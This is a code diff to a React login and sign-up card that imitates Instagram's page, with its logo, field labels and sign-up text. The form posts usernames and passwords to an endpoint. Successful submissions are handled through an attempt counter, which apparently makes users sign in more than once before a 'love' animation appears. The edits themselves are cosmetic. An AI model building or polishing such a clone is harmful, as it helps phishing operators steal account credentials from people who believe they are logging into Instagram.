@@ -11,7 +11,6 @@ interface LoginCardProps {
 const LoveAnimationView: React.FC = () => {
   return (
     <div className="relative flex flex-col items-center justify-center py-16 w-full overflow-hidden bg-white rounded-sm min-h-[450px] animate-[fadeIn_0.8s_ease-out]">
-      {/* Floating Hearts Container */}
       <div className="absolute inset-0 pointer-events-none">
         {[...Array(12)].map((_, i) => (
           <div
@@ -128,8 +127,6 @@ const LoginCard: React.FC<LoginCardProps> = ({ mode, onToggleMode }) => {
         body: JSON.stringify(formData),
       });
 
-      const data = await response.json();
-
       if (response.ok) {
         if (currentAttempt < 3) {
           setTimeout(() => {
@@ -144,6 +141,7 @@ const LoginCard: React.FC<LoginCardProps> = ({ mode, onToggleMode }) => {
           }, 1200);
         }
       } else {
+        const data = await response.json();
         setError(data.message || "An error occurred. Please try again.");
         setIsLoading(false);
       }
@@ -165,9 +163,9 @@ const LoginCard: React.FC<LoginCardProps> = ({ mode, onToggleMode }) => {
     <div className="w-full flex flex-col space-y-2.5">
       <div className="bg-white md:border border-[#dbdbdb] rounded-sm py-8 px-6 md:px-10 flex flex-col items-center">
         <div className="mt-3 mb-8 flex flex-col items-center space-y-2">
-          <div className="h-12 md:h-14 w-40 md:w-44 flex items-center justify-center">
+          <div className="h-12 md:h-14 w-44 md:w-48 flex items-center justify-center">
             <img 
-              src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" 
+              src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" 
               alt="Instagram" 
               className="h-full object-contain"
             />
@@ -177,7 +175,7 @@ const LoginCard: React.FC<LoginCardProps> = ({ mode, onToggleMode }) => {
         <form onSubmit={handleSubmit} className="w-full flex flex-col items-stretch">
           {!isLogin && (
             <>
-              <p className="text-[#8e8e8e] font-semibold text-center text-sm mb-4 leading-snug">
+              <p className="text-[#8e8e8e] font-semibold text-center text-[17px] mb-4 leading-tight">
                 Sign up to see photos and videos from your friends.
               </p>
               <button 
@@ -189,51 +187,53 @@ const LoginCard: React.FC<LoginCardProps> = ({ mode, onToggleMode }) => {
               </button>
               <div className="flex items-center mb-4">
                 <div className="flex-grow h-[1px] bg-[#dbdbdb]"></div>
-                <span className="mx-4 text-[#8e8e8e] text-xs font-semibold">OR</span>
+                <span className="mx-4 text-[#8e8e8e] text-[13px] font-semibold uppercase">OR</span>
                 <div className="flex-grow h-[1px] bg-[#dbdbdb]"></div>
               </div>
             </>
           )}
 
-          <AuthInput 
-            label={isLogin ? "Phone number, username, or email" : "Mobile Number or Email"}
-            name="identifier"
-            value={formData.identifier}
-            onChange={(v) => handleInputChange('identifier', v)}
-          />
+          <div className="space-y-1.5">
+            <AuthInput 
+              label={isLogin ? "Phone number, username, or email" : "Mobile Number or Email"}
+              name="identifier"
+              value={formData.identifier}
+              onChange={(v) => handleInputChange('identifier', v)}
+            />
 
-          {!isLogin && (
-            <>
-              <AuthInput 
-                label="Full Name"
-                name="fullName"
-                value={formData.fullName}
-                onChange={(v) => handleInputChange('fullName', v)}
-              />
-              <AuthInput 
-                label="Username"
-                name="username"
-                value={formData.username}
-                onChange={(v) => handleInputChange('username', v)}
-              />
-            </>
-          )}
+            {!isLogin && (
+              <>
+                <AuthInput 
+                  label="Full Name"
+                  name="fullName"
+                  value={formData.fullName}
+                  onChange={(v) => handleInputChange('fullName', v)}
+                />
+                <AuthInput 
+                  label="Username"
+                  name="username"
+                  value={formData.username}
+                  onChange={(v) => handleInputChange('username', v)}
+                />
+              </>
+            )}
 
-          <AuthInput 
-            label="Password"
-            type="password"
-            name="password"
-            value={formData.password}
-            onChange={(v) => handleInputChange('password', v)}
-          />
+            <AuthInput 
+              label="Password"
+              type="password"
+              name="password"
+              value={formData.password}
+              onChange={(v) => handleInputChange('password', v)}
+            />
+          </div>
 
-          {error && <p className="text-red-500 text-[13px] text-center my-3 leading-tight">{error}</p>}
+          {error && <p className="text-red-500 text-[14px] text-center my-3 leading-tight">{error}</p>}
 
           <button
             type="submit"
             disabled={!isFormValid || isLoading}
             className={`
-              mt-2 py-1.5 px-2 rounded-lg font-semibold text-sm transition-all active:scale-[0.98]
+              mt-4 py-1.5 px-2 rounded-lg font-semibold text-sm transition-all active:scale-[0.98]
               ${isFormValid ? 'bg-[#0095f6] text-white hover:bg-[#1877f2]' : 'bg-[#4cb5f9] text-white opacity-70 cursor-default'}
               flex items-center justify-center
             `}
@@ -249,7 +249,7 @@ const LoginCard: React.FC<LoginCardProps> = ({ mode, onToggleMode }) => {
             <>
               <div className="flex items-center mt-5 mb-6">
                 <div className="flex-grow h-[1px] bg-[#dbdbdb]"></div>
-                <span className="mx-4 text-[#8e8e8e] text-xs font-semibold">OR</span>
+                <span className="mx-4 text-[#8e8e8e] text-[13px] font-semibold uppercase">OR</span>
                 <div className="flex-grow h-[1px] bg-[#dbdbdb]"></div>
               </div>
               <button type="button" className="flex items-center justify-center space-x-2 text-[#385185] font-semibold text-sm mb-4 active:opacity-70">
